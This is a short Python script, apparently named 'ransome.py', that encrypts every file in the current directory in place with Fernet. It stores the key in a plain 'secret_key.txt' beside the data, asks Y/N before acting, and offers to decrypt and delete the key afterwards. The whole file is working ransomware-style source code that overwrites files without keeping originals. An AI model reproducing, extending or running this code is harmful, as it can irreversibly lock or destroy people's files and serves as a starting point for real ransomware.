#/usr/bin/python3.8
# pip install cryptography

import os
from cryptography.fernet import Fernet

g = os.listdir()
h = lambda r: [i for i in r]
print(h(g))


"""
    a program that will encrypt all files in a current directory,
    becarefull before you run it
"""


class CryptFile:
  """
  cryptography library must be installed in other to get started
  """
    
  file_lst = []
  for file in os.listdir():
    if file == 'ransome.py' or file == 'secret_key.txt':
      continue
    if os.path.isfile(file):
      file_lst.append(file)
      
  def __init__(self, file_lst=file_lst):
    self.file_lst = file_lst
    
    
  """ it will encrypt files """
  def encryptFile(self):
    key = Fernet.generate_key()
    with open('secret_key.txt', 'wb') as sk:
      sk.write(key)
      
      
    for file in self.file_lst:
      with open(file, 'rb') as f1:
        conts = f1.read()
      conts_encrypt = Fernet(key).encrypt(conts)
      
      with open(file, 'wb') as f2:
        f2.write(conts_encrypt)
  
  
  """ it will decrypt files """
  def decryptFile(self, key='secret_key.txt'):
    
    # opening the secret files
    with open(key, 'rb') as fr:
      df = fr.read()
      
    """
    for loop of which it will loop through your files and decrypt them,
    by opening them in read bytes, then capture it into a variable and then open the file again but in write bytes, in which it will write the variable of the decryption
    """
    
    for file in self.file_lst:
      with open(file, 'rb') as f1:
        conts = f1.read()
      conts_decrypt = Fernet(df).decrypt(conts)
      
      with open(file, 'wb') as f2:
        f2.write(conts_decrypt)
    # this will remove the secret (key) file as soon as it decrypt the files
    os.remove('secret_key.txt')
        
        
  """ it give you feed back about your files, whether if they are encrypted or not, """
  
  def run(self):
    
    if 'secret_key.txt' in os.listdir():
      print('\nIt seems your files are already encrypted! your are ready to unlock them')
      q = input('\nDo you want to decrypt your file? Y/N: ')
      while q != 'y' and q != 'Y' and q != 'n' and q != 'N':
        q = input('\nPlease, do you want to decrypt your file? Y/N: ')
      if q == 'Y' or q == 'y':
        self.decryptFile()
        print('\nYour files are decrypted')
      elif q == 'N' or q == 'n':
        print('\nYour files are not decrypted yet')
        
    else:
      q = input('\nDo you want to encrypt your file? Y/N: ')
      while q != 'y' and q != 'Y' and q != 'n' and q != 'N':
        q = input('\nPlease, do you want to encrypt your file? Y/N: ')
      if q == 'Y' or q == 'y':
        self.encryptFile()
        print('\nFiles encrypted!')
      elif q == 'N' or q == 'n':
        print('\nYour files are not encrypted')
        
        
CryptFile().run()
